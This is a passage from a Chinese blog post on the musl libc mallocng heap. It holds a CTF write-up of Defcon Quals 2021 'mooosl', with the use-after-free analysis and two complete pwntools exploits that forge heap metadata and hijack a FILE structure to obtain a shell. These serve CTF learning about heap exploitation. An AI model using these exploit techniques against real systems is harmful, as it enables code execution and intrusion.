class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&#x27;&#x27;, )</span></span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr_insert = elf.sym[<span class="string">&quot;insert&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>, length, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;UserName: &quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui</span>(<span class="params">times=<span class="number">1</span>, length=<span class="number">0x8</span>, name=<span class="string">&quot;aaad\n&quot;</span>, <span class="built_in">id</span>=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        add(<span class="built_in">id</span>, length, name)</span><br><span class="line">        <span class="built_in">id</span> += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## leak addr</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x38</span>, <span class="string">&quot;aaad\n&quot;</span>) <span class="comment"># users</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">fengshui(<span class="number">6</span>)</span><br><span class="line">check(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">addr_elf = u64(p.recv(<span class="number">0x10</span>)[-<span class="number">8</span>:]) - <span class="number">0x5ca0</span></span><br><span class="line">addr_libc = u64(p.recv(<span class="number">0x20</span>)[-<span class="number">8</span>:]) - <span class="number">0xb7d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&gt; addr_elf = &quot;</span>, <span class="built_in">hex</span>(addr_elf))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&gt; addr_libc = &quot;</span>, <span class="built_in">hex</span>(addr_libc))</span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xb6e48</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## write ofl_head to fake_file</span></span><br><span class="line">clear()</span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, <span class="string">&quot;aaad\n&quot;</span>) <span class="comment"># users</span></span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">fengshui(<span class="number">6</span>)</span><br><span class="line">fake_user = p64(<span class="number">0x6873</span>) + p64(addr_libc + <span class="number">0xb7a60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span class="line">fake_user += p64(<span class="number">0xdeadbeef</span>) + p64(addr_ofl_head - <span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, fake_user) <span class="comment"># user-&gt;name --&gt; users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## construct fake_file</span></span><br><span class="line">clear()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, p64(addr_system) * <span class="number">7</span>) <span class="comment"># ofl_head[0] = &quot;sh&quot;</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x38</span>, p64(<span class="number">0</span>) * <span class="number">7</span>) <span class="comment"># ofl_head-&gt;lock = 0</span></span><br><span class="line">fengshui(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="number">0x38</span>, p64(addr_system) * <span class="number">7</span>) <span class="comment"># ofl_head-&gt;write = system</span></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Defcon-Quals-2021-mooosl"><a href="#Defcon-Quals-2021-mooosl" class="headerlink" title="Defcon Quals 2021 mooosl"></a>Defcon Quals 2021 mooosl</h2><p>用的本地 libc，musl 1.2.2-4 amd64</p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>一个典型的菜单题，存储 KV</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KV</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *key;</span><br><span class="line">  <span class="type">char</span> *value;</span><br><span class="line">  __int64 key_size;</span><br><span class="line">  __int64 value_size;</span><br><span class="line">  __int64 hash;</span><br><span class="line">  KV *next_KV;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>store</strong></p>
<p>每次存储一个 KV，再申请 key 和 value 内存，计算 key 的 hash，取 hash 后 12 位将其放入 hash_map 中，用单链表存储 hash 后 12 位相同的 KV，头插法</p>
<p>可用于堆风水</p>
<p><strong>query</strong></p>
<p>先申请 key 内存，然后根据 key 的 hash 在 hash_map 中寻找对应的 KV，输出 value 内容，最后将 key 内存 free</p>
<p>可用于 堆风水</p>
<p><strong>delete</strong></p>
<p>先申请 key 内存，然后根据 key 的 hash 在 hash_map 中寻找对应的 KV，进行删除</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kv = search(key, key_size);</span><br><span class="line"><span class="keyword">if</span> ( kv )</span><br><span class="line">&#123;</span><br><span class="line">    chain = &amp;hash_map[kv-&gt;hash &amp; <span class="number">0xFFF</span>];</span><br><span class="line">    <span class="comment">// 这里忽略了一个条件，当 kv 是链表尾的时候，上一个 kv 的 next_KV 没有置零，导致 UAF</span></span><br><span class="line">    <span class="keyword">if</span> ( kv == *chain || kv-&gt;next_KV )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( kv != *chain )</span><br><span class="line">            chain = &amp;(*chain)-&gt;next_KV;</span><br><span class="line">        *chain = kv-&gt;next_KV;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(kv-&gt;key);</span><br><span class="line">    <span class="built_in">free</span>(kv-&gt;value);</span><br><span class="line">    <span class="built_in">free</span>(kv);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><ol>
<li>申请两个 hash 后 12 位相同的 kv，<code>delete</code> 后面一个造成 UAF</li>
<li>通过堆风水和 <code>query</code> 泄露出重要信息</li>
<li>再通过堆风水和 <code>delete</code>，伪造 meta_area，通过 unsafe_unlink 任意地址写<ul>
<li>主要是通过 <code>delete</code> 的 free(kv-&gt;key) 或 free(kv-&gt;value) 来 unlink</li>
<li>因为这两个指针可以任意写<del>（笔者想了好久死活没想出来）</del></li>
</ul>
</li>
<li>通过改写 ofl_head 指向伪造的 file 最后 exit 导致 FSOP<ul>
<li>下面是看别人 wp 是做法，要写三次，伪造三次<del>（逆天）</del></li>
<li>通过改写 stdout 的 write 函数指针为 <code>system</code> 和 flags 为 <code>/bin/sh\x00</code>，并使 wpos != wbase 即可导致 FSOP 拿到 shell</li>
</ul>
</li>
</ol>
<p>思路很简单，但是 exp 是真的难写😭😭</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line"><span class="comment"># p = remote(address[0], address[1])</span></span><br><span class="line">p = process(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-musl/libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key, value, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> value_size == <span class="literal">None</span> :</span><br><span class="line">        value_size = <span class="built_in">len</span>(value)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">key</span>):</span><br><span class="line">	vi = <span class="number">2021</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">		vi = <span class="number">0x13377331</span> * vi + key[i]</span><br><span class="line">	<span class="keyword">return</span> vi &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">key=<span class="string">b&quot;hhhh&quot;</span>, size=<span class="number">4</span></span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		new_key = (<span class="built_in">int</span>((random.random()) * <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>)) % <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line">		<span class="keyword">if</span> calc(key) == calc(new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)) :</span><br><span class="line">			<span class="keyword">return</span> new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        query(<span class="string">b&quot;h&quot;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>():</span><br><span class="line">    info = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        info = p.recv(<span class="number">2</span>) + info</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(info, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- leak info --</span></span><br><span class="line">fengshui1(<span class="number">1</span>)</span><br><span class="line">fengshui2(<span class="number">5</span>) <span class="comment"># AFFFFFU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak elf &amp; libc</span></span><br><span class="line">store(<span class="string">b&quot;hhhh&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x30</span>) <span class="comment"># [U]AAAA(U)U  [U] is KV, (U) is KV-&gt;value</span></span><br><span class="line">store(find_key(), <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>) <span class="comment"># [F]AAAUFU</span></span><br><span class="line"></span><br><span class="line">fengshui2(<span class="number">3</span>) <span class="comment"># FFFFUFU</span></span><br><span class="line">store(<span class="string">b&quot;H\n&quot;</span>, <span class="string">b&quot;H&quot;</span>, <span class="number">0x1000</span>) <span class="comment"># AAAAU[U]U  [U] is the chunk we can get</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">addr_mmap = get_leak() - <span class="number">0x20</span></span><br><span class="line">addr_libc = addr_mmap + <span class="number">0x4000</span></span><br><span class="line">addr_malloc_context = addr_libc + <span class="number">0xad9c0</span></span><br><span class="line">addr_elf = get_leak() - <span class="number">0xc8d0</span></span><br><span class="line">addr_hhhh = addr_elf + <span class="number">0xc890</span></span><br><span class="line">addr_KV = addr_elf + <span class="number">0xcde0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak secret</span></span><br><span class="line">delete(<span class="string">b&quot;H&quot;</span>) <span class="comment"># AAAAUFU</span></span><br><span class="line">fengshui2(<span class="number">2</span>) <span class="comment"># AAFFUFU</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(<span class="number">4</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>) <span class="comment"># UUFFUFU</span></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">secret = get_leak()</span><br><span class="line">get_leak()</span><br><span class="line">addr_heap = get_leak() - <span class="number">0x180</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;addr_elf: &quot;</span> + <span class="built_in">hex</span>(addr_elf))</span><br><span class="line">success(<span class="string">&quot;addr_mmap: &quot;</span> + <span class="built_in">hex</span>(addr_mmap))</span><br><span class="line">success(<span class="string">&quot;addr_libc: &quot;</span> + <span class="built_in">hex</span>(addr_libc))</span><br><span class="line">success(<span class="string">&quot;secret: &quot;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- construct --</span></span><br><span class="line"></span><br><span class="line">delete(KV) <span class="comment"># FFAAUFU</span></span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xafd48</span></span><br><span class="line">addr_fake_meta_area = addr_mmap + <span class="number">0x1000</span></span><br><span class="line">addr_fake_meta = addr_fake_meta_area + <span class="number">0x18</span></span><br><span class="line">addr_fake_group = addr_fake_meta + <span class="number">0x28</span></span><br><span class="line">addr_fake_chunk = addr_fake_group + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(last_idx | freeable &lt;&lt; <span class="number">5</span> | sc &lt;&lt; <span class="number">6</span> | maplen &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_meta_area = <span class="string">b&quot;h&quot;</span> * <span class="number">0xfd0</span></span><br><span class="line">fake_meta_area += p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = fake_meta_area</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += fake_chunk</span><br><span class="line">payload += <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">store(payload, <span class="string">b&quot;victim&quot;</span>, <span class="number">0x1200</span>) <span class="comment"># FFAUUFU</span></span><br><span class="line">store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line">fengshui2(<span class="number">1</span>) <span class="comment"># AAUUUFU</span></span><br><span class="line">addr_hhhh = addr_hhhh + <span class="number">0xb0</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(<span class="number">4</span>) + p64(<span class="number">0x80</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">musl libc 堆管理器 mallocng 详解 (Part I)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566">从musl libc 1.1.24到1.2.2 学习pwn姿势</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269533-1.htm">[原创]musl 1.2.2 总结+源码分析 One</a></p>
<p><a target="_blank" rel="noopener" href="http://pzhxbz.cn/?p=172">新版musl libc 浅析</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/xp0int/2022-%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int">2022-强网杯初赛-Writeup-By-Xp0int</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104">借助DefCon Quals 2021的mooosl学习musl mallocng</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Musl heap 浅析</p><p><a href="https://humoooor.cn/2022/10/10/Musl heap 浅析/">https://humoooor.cn/2022/10/10/Musl heap 浅析/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Humoooor</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-10-10</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-10-04</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Musl-libc/">Musl libc</a><a class="link-muted mr-2" rel="tag" href="/tags/Memory-Management/">Memory Management</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/10/11/FILE%20Exploration/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">FILE Exploration</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"><span class="level-item">Pwntools 的安装及使用</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script 